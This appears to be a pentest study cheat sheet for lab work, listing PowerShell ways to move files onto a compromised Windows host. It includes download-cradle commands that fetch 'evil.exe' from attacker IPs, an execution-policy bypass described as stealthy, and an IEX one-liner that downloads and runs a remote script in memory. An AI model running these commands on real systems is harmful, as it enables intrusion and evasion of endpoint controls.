---
description: >-
  Powershell File Download
title: Powershell Download              # Add title here
date: 2023-01-29 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Powershell Download]                     # Change Templates to Writeup
tags: [file transfer, powershell download]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### iwr (Invoke-Web-Request)
Transfer a file with the following command:
```bash
PS> iwr -uri http://10.10.14.4/PsBypassCLM.exe -OutFile PsBypassCLM.exe
```
[[Sizzle#^]]
Execute this commands to create wget.ps1 on victim machine:
```powershell
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```
To ensure both correct and stealthy execution, we specify a number of options in the execution of the script, it must be executed on cmd as shown below:
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
One-liner of the above command:
```bash
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://localhost/evil.exe', 'new-exploit.exe')
```
If we want to download and execute a PowerShell script without saving it to disk, we can once again use the System.Net.Webclient class. This is done by combining the DownloadString method with the Invoke-Expression cmdlet (IEX).3
To demonstrate this, we will create a simple PowerShell script on our Kali machine:
```bash
kali@kali:/var/www/html$ sudo cat helloworld.ps1 
Write-Output "Hello World"
```

Next, we will run the script with the following command on our compromised Windows machine (Listing 21):
```powershell
C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
Hello World
```

### New-Object
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```